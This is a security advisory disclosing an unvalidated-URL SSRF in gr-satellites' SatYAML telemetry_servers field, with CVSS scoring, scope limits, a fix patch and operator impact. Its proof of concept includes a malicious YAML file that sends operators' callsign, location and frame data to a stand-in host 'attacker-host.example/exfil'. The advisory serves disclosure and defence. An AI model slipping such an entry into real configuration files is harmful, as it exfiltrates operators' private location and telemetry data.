# Advisory 8 — Unvalidated URL in SatYAML telemetry_servers permits SSRF via loaded YAML

CVSS 3.1: `AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N` = **4.3 Medium**
CWE: CWE-918 (SSRF), CWE-501 (trust boundary violation)
Affected: gr-satellites `>= 3.6.0, <= 5.9.0` (SIDS support added in commit `6e242066`, 2020-11-18, first released in v3.6.0)
Audit reference: F104

## What happens

The `telemetry_servers:` field in a SatYAML file accepts a `SIDS <url>` entry. When present, every received frame for that satellite is POSTed to the operator-specified URL via `urllib.request.urlopen` at `python/submit.py:124`. The URL is not validated beyond `server.startswith('SIDS ')` — no scheme allow-list, no host allow-list, no timeout.

An operator who loads a malicious `.yml` from a mailing list, community wiki, or "support for satellite X" pull request silently POSTs their telemetry data (callsign, GPS, RF hex bytes) to whatever URL the YAML author chose. CPython's `urllib` handler set includes `file://`, `http://`, `https://`, `ftp://`, and `data:`, so the attacker can read local files (response discarded but the read happens), poke at internal RFC1918 addresses, and probe localhost services.

## Why this isn't an operator-misconfiguration bug

gr-satellites' own documentation doesn't warn operators to load only trusted YAML. A grep of `docs/source/` for `trust`, `untrust`, `malicious`, `attacker`, and `verify` in any SatYAML context returns zero matches. The `command_line.rst:77-78` paragraph actively encourages user-created or user-modified YAML loading without any caveat:

> "Specifying the path of a SatYAML file is useful if the user has modified some of the files bundled with gr-satellites or has created their own ones."

Operators reasonably treat shared YAML as benign.

## What this is not

Read-only SSRF; not escalatable to RCE in v5.9.0:

- `file://` + `data=` is silently ignored by CPython's `FileHandler.file_open()` (read-only handler)
- `gopher://`, `dict://`, `ldap://`, `jar://`, `sftp://`, `tftp://` aren't in CPython's default handler set
- HTTP redirect to `file://` is blocked by CPython's redirect handler since CVE-2019-9948 (Python ≥ 3.7.6)
- AWS IMDS response body is discarded by `submit.py:130-140` on the 200 OK path

## Proof of concept

`pocs/F104-satyaml-ssrf/`:

```yaml
# malicious_satellite.yml
name: TotallyLegit-Sat
norad: 99999
telemetry_servers: [SIDS http://attacker-host.example/exfil]
data:
  Telemetry:
    telemetry: ax25
```

```
gr_satellites pocs/F104-satyaml-ssrf/malicious_satellite.yml --iq --wavfile sample.wav
# attacker-host.example receives POST with operator's callsign, lat, lon, and frame hex
```

The PoC ships with a local mock attacker server (`mock_listener.py`) so you can run it without sending data anywhere real.

## Fix

`patches/0008-F104-satyaml-url-allowlist.patch`. Two changes:

1. Add a scheme allow-list (http/https only) and a timeout in `submit.py:124`
2. Add a security note to `docs/source/satyaml.rst` warning operators to only load YAML from trusted sources

## Behaviour change for existing operators

Any existing SatYAML file with a `SIDS file://…`, `SIDS ftp://…`, or
`SIDS data:…` entry will now fail to load with a `YAMLError` instead
of silently dispatching. Grep of the shipped `python/satyaml/*.yml`
files shows no such entries, so the bundled YAML is unaffected.
Operators who hand-rolled a malicious-or-benign non-http(s) `SIDS`
entry will need to switch to http/https.

## Notes

Reported by Marnick Vandecauter security@marnick.net as part of an independent security audit of gr-satellites v5.9.0 (May 2026). Research supported by Mamato Labs.
